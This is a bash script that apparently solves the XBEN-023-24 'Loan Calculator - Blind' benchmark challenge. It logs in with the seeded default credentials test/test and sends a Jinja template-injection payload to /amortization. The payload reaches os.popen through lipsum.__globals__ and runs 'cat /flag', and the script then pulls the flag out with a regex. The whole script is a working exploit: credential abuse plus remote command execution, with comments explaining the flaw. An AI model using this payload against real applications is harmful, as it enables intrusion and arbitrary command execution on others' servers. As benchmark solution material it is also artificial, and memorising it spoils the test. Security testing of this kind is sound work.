#!/usr/bin/env bash
# XBEN-023-24 — "Loan Calculator - Blind" (tags: default_credentials, ssti)
#
# `/amortization` builds its template with an f-string and drops `term` straight
# into the *source*:
#
#     {{% for row in range({term}) %}}
#
# So `term` is not data being rendered, it is template code being written. The
# payload closes the loop, evaluates an expression, and reopens a loop so the
# rest of the template still parses.
#
# `lipsum.__globals__` is the usual way to reach `os` from a Jinja sandbox
# escape: `lipsum` is a builtin global, its module globals include `os`, and
# from there `popen` reads the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-target/release/h5i}"
SESSION="xben023-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# The application seeds `test`/`test` and the calculator is behind the session.
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "input[name=username]" "test" --session "$SESSION" >/dev/null
"$H5I" browser type --selector "input[name=password]" "test" --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Login" --session "$SESSION" >/dev/null

PAYLOAD="1)%}{{lipsum.__globals__.os.popen('cat /flag').read()}}{%for _ in range(1"
"$H5I" browser navigate "$URL/amortization?term=$(python3 -c "
import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")" \
    --session "$SESSION" >/dev/null

"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
